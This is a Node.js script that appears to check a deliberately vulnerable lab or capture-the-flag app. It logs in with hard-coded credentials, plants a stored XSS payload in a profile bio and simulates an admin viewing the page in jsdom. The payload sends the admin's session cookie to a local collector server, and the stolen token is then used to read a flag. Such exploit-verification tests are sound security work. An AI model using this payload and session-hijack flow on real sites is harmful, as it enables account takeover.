#!/usr/bin/env node
/**
 * V2.3 Stored XSS — plant script, simulate admin viewing /admin in jsdom,
 * steal cookie via XHR beacon, read admin note flag.
 */
import http from 'node:http';
import { JSDOM } from 'jsdom';
import { extractFlag } from '../../../packages/shared/dist/index.js';

process.on('unhandledRejection', (e) => {
  console.error('FAIL:', e instanceof Error ? e.message : e);
  process.exit(1);
});

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');
const cookieName = 'bill_token';
let finished = false;

process.on('uncaughtException', (err) => {
  if (finished) return;
  console.error('FAIL:', err.message || err);
  process.exit(1);
});

function login(username, password) {
  return fetch(`${base}/api/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
  }).then((r) => r.json());
}

const stolenCookie = await new Promise((resolve, reject) => {
  const server = http.createServer((req, res) => {
    try {
      const u = new URL(req.url, 'http://collector.local');
      resolve(u.searchParams.get('c') || '');
    } finally {
      res.writeHead(200, {
        'Content-Type': 'text/plain',
        'Access-Control-Allow-Origin': '*',
      });
      res.end('ok');
      server.close();
    }
  });
  server.listen(0, '127.0.0.1', async () => {
    try {
      const port = server.address().port;
      const payload =
        `<script>(function(){var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1:${port}/?c='+encodeURIComponent(document.cookie));x.send();})()</script>`;

      const alice = await login('alice', 'alice123');
      await fetch(`${base}/api/profile`, {
        method: 'PATCH',
        headers: {
          Authorization: `Bearer ${alice.token}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ bio: payload }),
      });

      const admin = await login('admin', 'admin123');
      const adminHtml = await fetch(`${base}/admin`, {
        headers: {
          Authorization: `Bearer ${admin.token}`,
          Cookie: `${cookieName}=${admin.token}`,
          Accept: 'text/html',
        },
      }).then((r) => r.text());

      if (adminHtml.includes('&lt;script') || !adminHtml.includes('<script>')) {
        reject(new Error('XSS sink not active (escaped or missing)'));
        server.close();
        return;
      }

      // eslint-disable-next-line no-new
      new JSDOM(adminHtml, {
        url: `${base}/admin`,
        runScripts: 'dangerously',
        resources: 'usable',
        beforeParse(window) {
          window.document.cookie = `${cookieName}=${admin.token}; path=/`;
        },
      });

      setTimeout(() => reject(new Error('collector timeout — XSS did not fire')), 5000);
    } catch (err) {
      reject(err);
      server.close();
    }
  });
}).catch((err) => {
  console.error('FAIL:', err.message || err);
  process.exit(1);
});

const match = new RegExp(`${cookieName}=([^;\\s]+)`).exec(stolenCookie);
const token = match?.[1];
if (!token) {
  console.error('FAIL: no stolen cookie', stolenCookie);
  process.exit(1);
}

const noteRes = await fetch(`${base}/api/admin/note`, {
  headers: { Authorization: `Bearer ${token}` },
});
const text = await noteRes.text();
const flag = extractFlag(text);
if (noteRes.status !== 200 || !flag) {
  console.error('FAIL: could not read admin note with stolen session', text);
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V2.3 XSS');
finished = true;
process.exit(0);
